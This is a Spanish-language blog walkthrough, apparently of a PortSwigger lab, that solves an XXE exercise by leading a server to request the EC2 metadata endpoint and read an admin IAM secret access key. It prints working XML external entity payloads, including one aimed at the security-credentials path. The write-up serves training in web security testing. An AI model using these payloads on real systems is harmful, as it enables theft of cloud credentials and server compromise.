---
title: "Exploiting XXE to perform SSRF attacks"
date: 2024-11-27 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger
  - XXE Injection
tags:
  - XXE Injection
  - Exploiting XXE to perform SSRF attacks
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este laboratorio tiene una función llamada `Check stock` que analiza la `entrada` en `formato XML` y devuelve cualquier valor inesperado en la respuesta. El `servidor` del laboratorio está ejecutando un `endpoint` de `metadatos` de `EC2 (simulado)` en la `URL` predeterminada, que es `[http://169.254.169.254/](http://169.254.169.254/)`. Este `endpoint` puede usarse para obtener datos sobre la instancia, algunos de los cuales podrían ser sensibles. Para `resolver` el `laboratorio`, hay que `explotar` la vulnerabilidad `XXE` para llevar a cabo un ataque `SSRF` que `obtenga` la `clave secreta` de acceso `IAM` del servidor desde el `endpoint` de `metadatos` de `EC2`

---

## Resolución

Al `acceder` a la `web` nos sale esto

![](/assets/img/XXE-Injection-Lab-2/image_1.png)

Si pulsamos en `View details` veremos la `descripción` del `artículo`

![](/assets/img/XXE-Injection-Lab-2/image_2.png)

Si pulsamos en `Check stock` y `capturamos` la `petición` con `Burpsuite` vemos que se está tramitando un `XML`

![](/assets/img/XXE-Injection-Lab-2/image_3.png)

Vamos a insertar un `DTD (Document Type Definition)` y a `comprobar` si es `vulnerable` a `XXE`

```
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [<!ENTITY xxe "Doe"> ]>
	<stockCheck>
		<productId>
			&xxe;
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Obtenemos `Doe` lo que quiere decir que ha funcionado y probablemente sea `vulnerable` a un `XXE`

![](/assets/img/XXE-Injection-Lab-2/image_4.png)

Con este `payload` hacemos un petición al `endpoint`, por lo cual estaríamos explotando un `SSRF (Server Side Request Forgery)` a través de un `XXE`

```
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
	<stockCheck>
		<productId>
			&xxe;
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

La `respuesta` del `servidor` nos `devuelve` el `nombre`, en este caso es `latest`, debemos ir haciendo peticiones hasta `obtener` la `ruta` del `endpoint` completa

![](/assets/img/XXE-Injection-Lab-2/image_5.png)

Con este nuevo `payload` obtenemos la `secret acces key` del usuario `admin`

```
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
	<stockCheck>
		<productId>
			&xxe;
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

![](/assets/img/XXE-Injection-Lab-2/image_6.png)
